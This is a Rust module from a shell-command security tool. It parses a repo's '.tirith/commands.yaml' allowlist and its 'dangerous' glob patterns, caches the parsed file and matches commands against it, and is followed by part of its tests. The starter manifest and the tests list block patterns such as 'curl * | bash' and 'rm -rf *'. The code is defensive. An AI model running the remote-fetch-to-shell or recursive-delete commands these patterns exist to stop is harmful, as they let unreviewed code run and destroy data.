//! M11 ch2 — repo command manifest (`.tirith/commands.yaml`).
//!
//! A repo-controlled, **suppression-BOUNDED** allowlist of commands. The
//! manifest can do exactly two things, and NOTHING else:
//!
//! 1. **Suppress one Info rule.** An exact match in `allowed[*]` suppresses
//!    *only* [`RuleId::RepoCommandUnknown`] (Info) for the matched command —
//!    the "this command is not in the repo's catalogue" annotation. It cannot
//!    touch, downgrade, or remove any other finding.
//! 2. **Elevate.** A `dangerous[*]` glob match ADDS a
//!    [`RuleId::RepoCommandDangerousPattern`] finding, regardless of what the
//!    engine already found. With `action: block` (the default) the finding is
//!    High severity (which `action_from_findings` maps to [`Action::Block`]);
//!    with `action: warn` it is Medium severity (→ Warn action). There is no
//!    `Severity::Block` — "Block" names the *action*, derived from a High/
//!    Critical severity. Stricter-is-safe; this is always allowed.
//!
//! ## THE LOAD-BEARING INVARIANT
//!
//! The manifest **NEVER weakens** an engine finding of severity ≥ High. A
//! compromised repo that adds `curl … | bash` to `allowed[]` MUST still block,
//! because `action_from_findings` maps the engine's High/Critical
//! `pipe_to_interpreter` finding to [`Action::Block`] and the manifest match
//! changes nothing about that finding.
//!
//! This invariant is structural, not a runtime check: [`evaluate`] returns a
//! list of findings to ADD plus the matched allowed-entry name for audit
//! context. It is handed an immutable `&[Finding]` of what the engine already
//! produced and has **no API** to mutate or drop any of those findings. The
//! "suppression" of `RepoCommandUnknown` is implemented by *not emitting it*
//! when an allowed entry matches — there is no code path that removes a
//! pre-existing finding. A future refactor cannot accidentally re-couple the
//! audit-name path to action derivation, because the audit name is a separate
//! return field that the engine threads only into the audit log, never into
//! `action_from_findings`.
//!
//! ## Pattern syntax (v1)
//!
//! `dangerous[*].pattern` supports glob `*` ONLY (matches any run of
//! characters, including none). There is no `?`, no character classes, no
//! regex. `allowed[*].command` is an EXACT string match (after trimming
//! surrounding shell-significant whitespace — space/tab/newline/CR, see
//! [`crate::command_card::is_shell_significant_ws`] — on both sides). This is
//! documented in the starter file written by `tirith commands init`.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, UNIX_EPOCH};

use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// One entry under `allowed:` — a named, catalogued command.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct AllowedEntry {
    /// Short human label (`test`, `build`, …). Used by `tirith commands run
    /// <name>` and surfaced in audit context.
    pub name: String,
    /// The exact command line this entry catalogues.
    pub command: String,
}

/// The action a `dangerous[*]` entry requests on a match.
///
/// * `block` → adds a High `RepoCommandDangerousPattern` finding (→ Block).
/// * `warn`  → adds a Medium `RepoCommandDangerousPattern` finding (→ Warn).
///
/// A missing `action` defaults to `block` (the strict, safe default). An
/// UNKNOWN string value is REJECTED at deserialize time (serde has no catch-all
/// arm here) — a typo'd action fails the manifest load rather than silently
/// downgrading to a no-op, which preserves the "stricter is always safe"
/// posture. Both arms ELEVATE (add a finding); neither can weaken an engine
/// finding.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "snake_case")]
pub enum DangerousAction {
    #[default]
    Block,
    Warn,
}

impl DangerousAction {
    /// The finding severity this action maps to. High → Block action; Medium →
    /// Warn action (see [`crate::verdict::action_from_findings`]).
    fn severity(self) -> Severity {
        match self {
            DangerousAction::Block => Severity::High,
            DangerousAction::Warn => Severity::Medium,
        }
    }
}

/// One entry under `dangerous:` — a glob pattern that, when matched, elevates
/// the verdict.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct DangerousEntry {
    /// Glob pattern (`*` wildcard only in v1).
    pub pattern: String,
    /// Action to take on a match. Defaults to `block`.
    #[serde(default)]
    pub action: DangerousAction,
}

/// Parsed `.tirith/commands.yaml`.
///
/// `deny_unknown_fields` is load-bearing: with `#[serde(default)]` on both
/// lists, a typo'd top-level key (`dangerouss:` / `allowedd:`) would otherwise
/// be silently ignored and the manifest would load with EMPTY lists — quietly
/// disabling the operator's `dangerous[]` elevations. Rejecting unknown keys
/// turns that typo into a loud parse error instead.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct CommandsManifest {
    #[serde(default)]
    pub allowed: Vec<AllowedEntry>,
    #[serde(default)]
    pub dangerous: Vec<DangerousEntry>,
}

/// Error loading a manifest.
#[derive(Debug)]
pub enum ManifestError {
    Io(std::io::Error),
    Parse(String),
}

impl std::fmt::Display for ManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ManifestError::Io(e) => write!(f, "io error: {e}"),
            ManifestError::Parse(e) => write!(f, "yaml parse error: {e}"),
        }
    }
}

impl std::error::Error for ManifestError {}

/// The result of evaluating a command against a manifest.
///
/// SECURITY: this carries findings to ADD and an audit-only name. It does NOT
/// carry any handle to the engine's existing findings — the manifest cannot
/// remove or weaken them. See the module-level invariant.
///
/// (`Finding` is not `Eq`, so this is not `PartialEq`/`Eq`; tests assert on the
/// individual fields — `findings` rule_ids/severities and
/// `matched_allowed_name`.)
#[derive(Debug, Clone, Default)]
pub struct ManifestOutcome {
    /// Findings the manifest contributes (at most one). Either a single
    /// `RepoCommandUnknown` (Info) when the command is not catalogued, OR one
    /// or more `RepoCommandDangerousPattern` (High → Block action for
    /// `action: block`, Medium → Warn action for `action: warn`) when a
    /// dangerous pattern matched. Never both: a dangerous match takes precedence
    /// over the
    /// "unknown" annotation (a dangerous command is, by definition, not a
    /// benign uncatalogued one).
    pub findings: Vec<Finding>,
    /// The `allowed[*].name` of the entry that matched this command, if any.
    /// AUDIT-CONTEXT ONLY — the engine logs this for traceability and MUST NOT
    /// feed it into action derivation. `None` when no allowed entry matched.
    pub matched_allowed_name: Option<String>,
}

const MANIFEST_FILENAME: &str = "commands.yaml";

/// Upper bound on the bytes read from `.tirith/commands.yaml`. The manifest is a
/// list of allowed/dangerous command strings; 256 KiB is far more than a genuine
/// one needs (thousands of entries). The file is REPO-controlled and read on the
/// exec hot path, so the read goes through [`crate::util::read_regular_capped`]:
/// a FIFO/device at the path cannot block the open and an oversized file cannot
/// allocate unbounded — both are mapped to a fail-safe parse error (CodeRabbit
/// R17 #1, read-guard class). Mirrors the engine card / incident-flag / salt
/// reads that already use the hardened reader.
const MANIFEST_READ_CAP: u64 = 256 * 1024;

impl CommandsManifest {
    /// Parse a manifest from YAML text.
    ///
    /// After deserializing, rejects a manifest with DUPLICATE `allowed[].name`
    /// values (CodeRabbit R11 #5): `commands run <name>` and `match_allowed` are
    /// first-match lookups, so two entries sharing a name make which one runs /
    /// is reported ORDER-DEPENDENT and ambiguous. Failing the load turns that
    /// latent ambiguity into a loud, fixable parse error rather than silent
    /// first-wins behaviour. Duplicate `dangerous[].pattern` values are rejected
    /// too — they are pure redundancy (every match already collects ALL matching
    /// patterns), and a duplicated dangerous glob is almost always a copy-paste
    /// mistake worth surfacing.
    pub fn from_yaml(text: &str) -> Result<Self, ManifestError> {
        let manifest: Self =
            serde_yaml::from_str(text).map_err(|e| ManifestError::Parse(e.to_string()))?;
        manifest.validate_no_duplicates()?;
        Ok(manifest)
    }

    /// Error on duplicate `allowed[].name` or duplicate `dangerous[].pattern`.
    /// Names/patterns are deduped after trimming surrounding shell-significant
    /// whitespace (space/tab/newline/CR — the same `is_shell_significant_ws`
    /// predicate the matchers use), so two entries that differ ONLY by such
    /// surrounding whitespace are rejected as the duplicates they effectively
    /// are at match time (they would resolve to the same first-match key).
    fn validate_no_duplicates(&self) -> Result<(), ManifestError> {
        // Dedup on the SAME shell-significant-whitespace-trimmed key the matchers
        // compare with (`match_allowed`/`match_dangerous` use `trim_shell_ws`),
        // so two entries that differ only by surrounding shell-significant
        // whitespace are caught as the duplicates they effectively are at match
        // time.
        let mut seen_names = std::collections::HashSet::with_capacity(self.allowed.len());
        for entry in &self.allowed {
            if !seen_names.insert(trim_shell_ws(&entry.name)) {
                return Err(ManifestError::Parse(format!(
                    "duplicate allowed[].name {:?}: each catalogued command name must be unique \
                     (first-match lookup makes a duplicate name ambiguous)",
                    entry.name
                )));
            }
        }
        let mut seen_patterns = std::collections::HashSet::with_capacity(self.dangerous.len());
        for entry in &self.dangerous {
            if !seen_patterns.insert(trim_shell_ws(&entry.pattern)) {
                return Err(ManifestError::Parse(format!(
                    "duplicate dangerous[].pattern {:?}: a dangerous pattern is redundant if \
                     listed twice",
                    entry.pattern
                )));
            }
        }
        Ok(())
    }

    /// Load the manifest from a specific file path.
    ///
    /// HARDENED READ (CodeRabbit R17 #1, read-guard class): the path is
    /// REPO-controlled and read on the exec hot path (via [`Self::discover`]), so
    /// a plain `std::fs::read_to_string` would BLOCK on a FIFO/device pointed at
    /// the path, or allocate unbounded on a huge file. Route through
    /// [`crate::util::read_regular_capped`] (opens `O_NONBLOCK`, fstats the open
    /// fd, caps at [`MANIFEST_READ_CAP`]). A non-regular / oversized / non-UTF-8
    /// file maps to a [`ManifestError::Parse`] — fail-SAFE, because the hot-path
    /// caller treats any error as "no usable manifest" and never as permissive.
    pub fn load_from_path(path: &Path) -> Result<Self, ManifestError> {
        let bytes = match crate::util::read_regular_capped(path, MANIFEST_READ_CAP) {
            Ok(b) => b,
            Err(crate::util::OpenRegularError::NotFound) => {
                return Err(ManifestError::Io(std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    format!("{}: no such manifest file", path.display()),
                )))
            }
            Err(crate::util::OpenRegularError::Io(e)) => return Err(ManifestError::Io(e)),
            Err(crate::util::OpenRegularError::NotRegularFile) => {
                return Err(ManifestError::Parse(format!(
                    "{} is not a regular file (refusing a FIFO/device/socket)",
                    path.display()
                )))
            }
            Err(crate::util::OpenRegularError::TooLarge) => {
                return Err(ManifestError::Parse(format!(
                    "{} exceeds the {MANIFEST_READ_CAP}-byte manifest read cap",
                    path.display()
                )))
            }
        };
        let text = String::from_utf8(bytes)
            .map_err(|e| ManifestError::Parse(format!("manifest is not valid UTF-8: {e}")))?;
        Self::from_yaml(&text)
    }

    /// Cheap existence probe for the tier-1 force-past gate: does a
    /// `.tirith/commands.yaml` exist for `cwd`? A single `symlink_metadata` stat
    /// per candidate (see [`manifest_path_present`]), mirroring
    /// [`crate::taint::store_nonempty`]. When this is
    /// `false` the engine never reads the manifest, so a repo without one pays
    /// nothing past the stat. See [`discover_manifest_path`].
    pub fn exists_for(cwd: Option<&str>) -> bool {
        discover_manifest_path(cwd).is_some()
    }

    /// Discover and load `.tirith/commands.yaml` for the given cwd.
    ///
    /// Resolution mirrors [`crate::policy::discover_local_policy_path`] so the
    /// manifest lives next to `policy.yaml`:
    /// `TIRITH_POLICY_ROOT/.tirith/commands.yaml` → walk up from `cwd` to the
    /// `.git` boundary looking for `.tirith/commands.yaml`. Returns `Ok(None)`
    /// when no manifest file exists (the common, no-manifest case), and
    /// `Err(..)` only when a present file fails to read or parse.
    ///
    /// HOT PATH: this runs on every `engine::analyze`. The parse is backed by a
    /// per-process cache keyed on `(resolved_path, mtime)` with a 5-second TTL —
    /// mirroring [`crate::incident`] / [`crate::canary`] — so a repeated check
    /// in the same repo re-reads + re-parses the YAML at most once per 5s (and
    /// re-parses immediately if the file's mtime changes). Path resolution
    /// (`discover_manifest_path`, a few `symlink_metadata` stats) still runs
    /// each call; it is cheap and `cwd`-dependent, so it is intentionally not
    /// cached.
    pub fn discover(cwd: Option<&str>) -> Result<Option<Self>, ManifestError> {
        match discover_manifest_path(cwd) {
            Some(path) => cached_load(&path).map(Some),
            None => Ok(None),
        }
    }

    /// True when `command` exactly matches an `allowed[*].command` (after
    /// trimming surrounding shell-significant whitespace — space/tab/newline/CR,
    /// see [`crate::command_card::is_shell_significant_ws`] — on both sides).
    /// Returns the matching entry's `name` for audit context.
    ///
    /// SHELL-SIGNIFICANT-WHITESPACE trim (CodeRabbit R9 #A), in lockstep with
    /// the [`crate::command_card::Card::command_matches`] gate (which trims the
    /// same narrower set — NOT `str::trim`, NOT even
    /// [`char::is_ascii_whitespace`]). `str::trim` strips the full Unicode
    /// `White_Space` set; a manifest entry padded with a Unicode-whitespace char
    /// (e.g. a U+00A0 NO-BREAK SPACE) would then trim equal to an ASCII-space
    /// command, disagreeing with the command-card gate (which would treat it as
    /// a mismatch). Both comparators MUST agree on exactly which bytes are
    /// whitespace, so manifest matching trims via `trim_shell_ws`.
    pub fn match_allowed(&self, command: &str) -> Option<&str> {
        let needle = trim_shell_ws(command);
        self.allowed
            .iter()
            .find(|e| trim_shell_ws(&e.command) == needle)
            .map(|e| e.name.as_str())
    }

    /// All `dangerous[*]` entries whose glob pattern matches `command`.
    ///
    /// SHELL-SIGNIFICANT-WHITESPACE trim on both the command and each pattern
    /// (CodeRabbit R9 #A), matching [`Self::match_allowed`] and the command-card
    /// gate — see that method's note. A Unicode-whitespace-padded
    /// `dangerous[*].pattern` must not silently trim to a bare glob.
    pub fn match_dangerous(&self, command: &str) -> Vec<&DangerousEntry> {
        let needle = trim_shell_ws(command);
        self.dangerous
            .iter()
            .filter(|e| glob_match(trim_shell_ws(&e.pattern), needle))
            .collect()
    }

    /// Evaluate `command` against this manifest, given what the engine already
    /// found (`engine_findings`, read-only).
    ///
    /// Rules:
    /// - A `dangerous[*]` match ADDS a `RepoCommandDangerousPattern` finding
    ///   (elevation, always allowed) — High severity (→ Block action) for
    ///   `action: block`, Medium (→ Warn action) for `action: warn`. When any
    ///   dangerous pattern matches, that is the whole contribution (no
    ///   `RepoCommandUnknown`).
    /// - Otherwise, if the command is NOT in `allowed[*]`, ADD an Info
    ///   `RepoCommandUnknown` finding.
    /// - If the command IS in `allowed[*]` (and no dangerous match), contribute
    ///   NOTHING but record the matched name for audit context. This is the
    ///   sole suppression: it suppresses only the `RepoCommandUnknown` that
    ///   would otherwise be emitted.
    ///
    /// `engine_findings` is accepted as an immutable `&[Finding]` but is
    /// DELIBERATELY NOT READ (hence the `_` binding): the manifest's
    /// contribution is computed purely from `command` and the manifest's own
    /// `allowed[]`/`dangerous[]` entries. `RepoCommandUnknown` is emitted
    /// regardless of what the engine found — the final action still follows the
    /// engine's max severity over the combined list. Taking the slice by
    /// shared reference with no mutation/return path is exactly what makes the
    /// load-bearing "manifest cannot weaken an engine finding" invariant
    /// STRUCTURAL: there is simply no API here to touch an existing finding.
    pub fn evaluate(&self, command: &str, _engine_findings: &[Finding]) -> ManifestOutcome {
        let matched_allowed_name = self.match_allowed(command).map(str::to_string);

        let dangerous = self.match_dangerous(command);
        if !dangerous.is_empty() {
            // Elevation path: stricter is always safe. We still record the
            // matched allowed name (if any) for audit context, but the
            // dangerous finding stands regardless — a repo that lists a
            // command under BOTH `allowed` and `dangerous` gets blocked
            // (dangerous wins; you cannot allow-list your way out of a
            // dangerous pattern).
            let findings = dangerous
                .iter()
                .map(|e| dangerous_finding(&e.pattern, command, e.action))
                .collect();
            return ManifestOutcome {
                findings,
                matched_allowed_name,
            };
        }

        if matched_allowed_name.is_some() {
            // Suppression path: the command is catalogued. Suppress the
            // `RepoCommandUnknown` annotation (by not emitting it). Contribute
            // nothing else — the engine's other findings are untouched.
            ManifestOutcome {
                findings: Vec::new(),
                matched_allowed_name,
            }
        } else {
            // Annotation path: the command cleared the engine but is not in the
            // repo's catalogue. Emit the Info note. Action still follows the
            // engine's findings (Info never raises the action above Allow on
            // its own, and never lowers a higher action).
            ManifestOutcome {
                findings: vec![unknown_finding(command)],
                matched_allowed_name: None,
            }
        }
    }
}

/// Build the Info `RepoCommandUnknown` finding for an uncatalogued command.
fn unknown_finding(command: &str) -> Finding {
    Finding {
        rule_id: RuleId::RepoCommandUnknown,
        severity: Severity::Info,
        title: "Command not in repo command manifest".to_string(),
        description: "The command is not listed under `allowed[]` in this repo's \
             `.tirith/commands.yaml`. This is informational only and does not \
             change the verdict; add it with `tirith commands init` / by hand \
             if it is an expected repo command."
            .to_string(),
        evidence: vec![Evidence::CommandPattern {
            pattern: "allowed[*].command (exact match)".to_string(),
            // Shell-significant-whitespace trim (CodeRabbit R12 #G): the reported
            // `matched` value MUST be exactly what the `match_allowed`/
            // `trim_shell_ws` matcher saw. A Unicode `str::trim` here would strip
            // non-shell-significant whitespace (e.g. U+00A0) that the matcher
            // KEPT, so the evidence would not reflect the bytes that actually
            // (mis)matched.
            matched: trim_shell_ws(command).to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Build the Info finding surfaced when a `.tirith/commands.yaml` is PRESENT but
/// could not be loaded (malformed YAML, a non-regular file, oversized, etc.).
///
/// Reuses [`RuleId::RepoCommandUnknown`] (Info) rather than minting a new id: a
/// broken manifest is, from the verdict's perspective, the same "this command is
/// not catalogued by the manifest" state — except the operator is also told WHY
/// (their manifest is broken and its `allowed[]`/`dangerous[]` rules are not
/// being applied), instead of the engine silently ignoring it. Info-only: this
/// never raises the action and, like every manifest finding, never weakens an
/// engine finding. `reason` is the [`ManifestError`] `Display` string.
pub(crate) fn unloadable_finding(reason: &str) -> Finding {
    Finding {
        rule_id: RuleId::RepoCommandUnknown,
        severity: Severity::Info,
        title: "Repo command manifest present but could not be loaded".to_string(),
        description: format!(
            "This repo's `.tirith/commands.yaml` exists but could not be loaded \
             ({reason}); its `allowed[]`/`dangerous[]` rules are NOT being \
             applied. This is informational only and does not change the verdict. \
             Fix the manifest (or remove it) so its rules take effect."
        ),
        evidence: vec![Evidence::CommandPattern {
            pattern: ".tirith/commands.yaml (load failed)".to_string(),
            matched: reason.to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Build the `RepoCommandDangerousPattern` finding for a dangerous match. The
/// entry's `action` selects the severity: `block` → High (→ Block action),
/// `warn` → Medium (→ Warn action). Both ELEVATE; neither weakens an existing
/// engine finding.
fn dangerous_finding(pattern: &str, command: &str, action: DangerousAction) -> Finding {
    let severity = action.severity();
    let action_word = match action {
        DangerousAction::Block => "block",
        DangerousAction::Warn => "warn on",
    };
    Finding {
        rule_id: RuleId::RepoCommandDangerousPattern,
        severity,
        title: "Command matches a repo-flagged dangerous pattern".to_string(),
        description: format!(
            "The command matches the dangerous pattern '{}' declared under \
             `dangerous[]` in this repo's `.tirith/commands.yaml`. The repo has \
             explicitly flagged this shape to {action_word}.",
            trim_shell_ws(pattern)
        ),
        // Shell-significant-whitespace trim (CodeRabbit R12 #G): both the
        // `pattern` and the `matched` command in the evidence MUST be exactly the
        // strings the `match_dangerous`/`glob_match` matcher compared, so the
        // reported evidence reflects what actually matched (a Unicode `str::trim`
        // would diverge on the non-shell-significant whitespace the matcher
        // preserved).
        evidence: vec![Evidence::CommandPattern {
            pattern: trim_shell_ws(pattern).to_string(),
            matched: trim_shell_ws(command).to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

// ---- Hot-path parse cache -------------------------------------------------

/// Per-process cache of a parsed manifest, keyed on the resolved file path.
/// Mirrors [`crate::incident`] / [`crate::canary`]: load once, 5-second TTL,
/// re-parse on the file's mtime change. Keyed on the resolved manifest PATH
/// (not `cwd`), so multiple cwds resolving to the same manifest share the entry.
struct CacheState {
    path: PathBuf,
    manifest: CommandsManifest,
    loaded_at: Instant,
    mtime_nanos: u128,
}

static CACHE: Mutex<Option<CacheState>> = Mutex::new(None);

const CACHE_TTL: Duration = Duration::from_secs(5);

fn manifest_mtime_nanos(path: &Path) -> u128 {
    std::fs::metadata(path)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_nanos())
        .unwrap_or(0)
}

/// Load + parse the manifest at `path` through the per-process cache. Reloads
/// when the cached path differs, the TTL expired, or the file's mtime changed.
/// A parse/IO error is NOT cached (so a transient error does not stick): it is
/// returned and the cache is left for the next call to retry.
fn cached_load(path: &Path) -> Result<CommandsManifest, ManifestError> {
    let cur_mtime = manifest_mtime_nanos(path);
    let now = Instant::now();
    {
        let guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(state) = guard.as_ref() {
            let fresh = state.path == path
                && now.duration_since(state.loaded_at) < CACHE_TTL
                && state.mtime_nanos == cur_mtime;
            if fresh {
                return Ok(state.manifest.clone());
            }
        }
    }

    // Miss / stale: read + parse outside the lock, then store.
    let manifest = CommandsManifest::load_from_path(path)?;
    let mut guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    *guard = Some(CacheState {
        path: path.to_path_buf(),
        manifest: manifest.clone(),
        loaded_at: now,
        mtime_nanos: cur_mtime,
    });
    Ok(manifest)
}

/// Drop the per-process manifest cache. Tests that write/edit a manifest then
/// assert via [`CommandsManifest::discover`] call this so a stale earlier load
/// is not reused.
pub fn invalidate_cache() {
    let mut guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    *guard = None;
}

/// Does a path ENTRY exist at `candidate` — even if it is a symlink, directory,
/// or FIFO?
///
/// CodeRabbit R19 #1: presence detection must NOT use `Path::is_file()`. That
/// FOLLOWS symlinks and coerces metadata/IO failures + non-regular entries (a
/// directory, FIFO, dangling symlink) to `false`, so a PRESENT-but-broken
/// `.tirith/commands.yaml` would be read as ABSENT — the discovery walk would
/// step right over it and the suppression-bounded note + dangerous-glob
/// enforcement would both silently vanish. Use `symlink_metadata` instead (it
/// does NOT traverse the final symlink): any extant entry — regular file,
/// directory, FIFO, even a dangling symlink — counts as PRESENT and STOPS the
/// walk, leaving the present-but-not-a-regular-file case to the hardened
/// [`CommandsManifest::load_from_path`] (round-17 `read_regular_capped`), which
/// fail-SAFELY surfaces it as a parse error rather than "no manifest, walk on".
///
/// FAIL-SAFE on stat errors (CodeRabbit R13f, sibling of the incident/taint cache
/// reads): only a genuine `NotFound` means absent. ANY OTHER `symlink_metadata`
/// error (`EACCES`, a symlink loop, an I/O fault) means the entry is PRESENT but
/// unstattable — treat it as present so discovery stops here and surfaces the
/// unloadable manifest, rather than stepping over it (which would silently drop
/// the repo-manifest note AND `dangerous[]` enforcement for a manifest that is
/// really there).
fn manifest_path_present(candidate: &Path) -> bool {
    match candidate.symlink_metadata() {
        Ok(_) => true,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
        Err(_) => true,
    }
}

/// Resolve the path of `.tirith/commands.yaml` for `cwd`, mirroring policy
/// discovery: `TIRITH_POLICY_ROOT/.tirith/commands.yaml` first, then walk up
/// from `cwd` to the `.git` boundary.
fn discover_manifest_path(cwd: Option<&str>) -> Option<PathBuf> {
    if let Ok(root) = std::env::var("TIRITH_POLICY_ROOT") {
        let candidate = PathBuf::from(&root).join(".tirith").join(MANIFEST_FILENAME);
        if manifest_path_present(&candidate) {
            return Some(candidate);
        }
    }
    let start = cwd
        .map(PathBuf::from)
        .or_else(|| std::env::current_dir().ok())?;
    let mut current = start.as_path();
    loop {
        let candidate = current.join(".tirith").join(MANIFEST_FILENAME);
        if manifest_path_present(&candidate) {
            return Some(candidate);
        }
        // `.git` may be a directory or a file (worktrees); `.exists()` handles
        // both. Stop at the repo boundary so we never escape into a parent
        // repo's manifest.
        if current.join(".git").exists() {
            return None;
        }
        match current.parent() {
            Some(parent) if parent != current => current = parent,
            _ => return None,
        }
    }
}

/// Resolve where `tirith commands init` should write the starter manifest for a
/// given cwd: `<repo-root>/.tirith/commands.yaml` when inside a git repo, else
/// `<cwd>/.tirith/commands.yaml`.
pub fn init_manifest_path(cwd: Option<&str>) -> Option<PathBuf> {
    let root = crate::policy::find_repo_root(cwd).or_else(|| {
        cwd.map(PathBuf::from)
            .or_else(|| std::env::current_dir().ok())
    })?;
    Some(root.join(".tirith").join(MANIFEST_FILENAME))
}

/// The starter manifest written by `tirith commands init`.
pub const STARTER_MANIFEST: &str = r#"# tirith repo command manifest (.tirith/commands.yaml)
#
# This file is SUPPRESSION-BOUNDED. It can do exactly two things:
#
#   1. `allowed[]` — an exact-match catalogue of expected repo commands.
#      Listing a command here suppresses ONLY the informational
#      `repo_command_unknown` note for that exact command. It does NOT and
#      CANNOT weaken any real finding: a command that the engine flags as
#      High/Critical (e.g. `curl ... | bash`) STILL BLOCKS even if it is
#      listed under `allowed[]`.
#
#   2. `dangerous[]` — glob patterns (only `*` is supported in v1) that, when
#      matched, ADD a `repo_command_dangerous_pattern` finding regardless of
#      what the engine found. Each entry's `action` chooses the severity:
#        - action: block  (default) -> High, BLOCKS the command.
#        - action: warn             -> Medium, WARNS (surfaced + acknowledgeable,
#                                      not blocked).
#      Either way the manifest only makes a repo STRICTER, never weaker.
#
# Run `tirith commands list` to see the catalogue, `tirith commands run <name>`
# to execute an allowed command, and `tirith commands check -- "<cmd>"` to
# evaluate an arbitrary command against this manifest + the engine.

allowed:
  - name: test
    command: npm test
  - name: build
    command: npm run build

dangerous:
  - pattern: "curl * | bash"
    action: block
"#;

/// Trim ONLY the shell-significant whitespace a shell treats as a TOKEN
/// SEPARATOR (space, tab, newline, CR), never the full Unicode `White_Space`
/// set and never `\x0C` FORM FEED. Load-bearing for the manifest
/// command/pattern comparison (CodeRabbit R9 #A, narrowed R13 #3): it MUST
/// agree, byte-for-byte, with the
/// [`crate::command_card::Card::command_matches`] mismatch gate on which bytes
/// count as surrounding whitespace, so it shares the SAME predicate
/// (`command_card::is_shell_significant_ws`). `str::trim` would strip
/// U+00A0 / U+2007 / etc., and `str::trim_ascii` / `char::is_ascii_whitespace`
/// would strip a form feed — either would let a padded manifest entry match a
/// command the command-card gate would reject; the two must not disagree on
/// whitespace. The name deliberately does NOT say "ascii": this is the narrower
/// shell-significant set, and a maintainer must not "simplify" it to
/// `str::trim_ascii()` (which would reintroduce a form-feed match bypass).
fn trim_shell_ws(s: &str) -> &str {
    s.trim_matches(crate::command_card::is_shell_significant_ws)
}

/// Minimal glob matcher supporting only the `*` wildcard (matches any run of
/// characters, including the empty string). No `?`, no character classes, no
/// regex. Anchored at both ends (the whole `text` must be consumed).
///
/// Implemented as a classic two-pointer backtracking matcher over chars so it
/// is correct for non-ASCII input and has no external dependency.
fn glob_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();

    let mut pi = 0usize; // index into pattern
    let mut ti = 0usize; // index into text
    let mut star_pi: Option<usize> = None; // last '*' position in pattern
    let mut star_ti = 0usize; // text index when last '*' was seen

    while ti < t.len() {
        if pi < p.len() && p[pi] == '*' {
            // Record the star and try to match zero characters first.
            star_pi = Some(pi);
            star_ti = ti;
            pi += 1;
        } else if pi < p.len() && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if let Some(sp) = star_pi {
            // Mismatch: let the last '*' consume one more character.
            pi = sp + 1;
            star_ti += 1;
            ti = star_ti;
        } else {
            return false;
        }
    }

    // Consume any trailing '*' in the pattern.
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }

    pi == p.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest() -> CommandsManifest {
        CommandsManifest::from_yaml(STARTER_MANIFEST).expect("starter parses")
    }

    #[test]
    fn starter_manifest_parses() {
        let m = manifest();
        assert_eq!(m.allowed.len(), 2);
        assert_eq!(m.allowed[0].name, "test");
        assert_eq!(m.allowed[0].command, "npm test");
        assert_eq!(m.dangerous.len(), 1);
        assert_eq!(m.dangerous[0].pattern, "curl * | bash");
        assert_eq!(m.dangerous[0].action, DangerousAction::Block);
    }

    #[test]
    fn unknown_top_level_key_is_rejected() {
        // F2 (Major): a typo'd top-level key must FAIL the load rather than be
        // silently ignored (which would load empty lists and disable the
        // operator's elevations). `deny_unknown_fields` enforces this.
        let typo = "dangerouss:\n  - pattern: \"curl * | bash\"\n";
        let err = CommandsManifest::from_yaml(typo)
            .expect_err("a misspelled top-level key must be a parse error");
        assert!(matches!(err, ManifestError::Parse(_)), "got {err:?}");

        // A correctly-spelled manifest still parses (no false positive).
        let ok = "dangerous:\n  - pattern: \"curl * | bash\"\n";
        let m = CommandsManifest::from_yaml(ok).expect("valid manifest parses");
        assert_eq!(m.dangerous.len(), 1);
    }

    #[test]
    fn duplicate_allowed_name_is_rejected() {
        // CodeRabbit R11 #5: two `allowed[]` entries sharing a `name` make
        // `commands run <name>` / `match_allowed` order-dependent. The load must
        // FAIL with a clear error rather than silently pick the first.
        let dup = "allowed:\n  - name: build\n    command: npm run build\n  - name: build\n    command: make\n";
        let err = CommandsManifest::from_yaml(dup)
            .expect_err("a duplicate allowed[].name must be a parse error");
        match err {
            ManifestError::Parse(msg) => {
                assert!(
                    msg.contains("duplicate allowed[].name") && msg.contains("build"),
                    "error must name the duplicate, got: {msg}"
                );
            }
            other => panic!("expected Parse error, got {other:?}"),
        }
        // Distinct names still parse (no false positive).
        let ok = "allowed:\n  - name: build\n    command: npm run build\n  - name: test\n    command: npm test\n";
        let m = CommandsManifest::from_yaml(ok).expect("distinct names parse");
        assert_eq!(m.allowed.len(), 2);
    }

    #[test]
    fn duplicate_names_differing_only_by_shell_whitespace_are_rejected() {
        // CodeRabbit R20: the matchers compare shell-significant-whitespace-
        // trimmed, so `"build"` and `"build "` are the SAME command at match
        // time — dedup must use the same normalization and reject them as
        // duplicates.
        let dup =
            "allowed:\n  - name: \"build\"\n    command: a\n  - name: \"build \"\n    command: b\n";
        let err = CommandsManifest::from_yaml(dup).expect_err(
            "names differing only by trailing shell-significant whitespace must be duplicates",
        );
        assert!(matches!(err, ManifestError::Parse(_)));
        // Same for dangerous[].pattern.
        let dup_pat =
            "dangerous:\n  - pattern: \"rm -rf *\"\n  - pattern: \" rm -rf *\"\n    action: warn\n";
        assert!(CommandsManifest::from_yaml(dup_pat).is_err());
    }

    #[test]
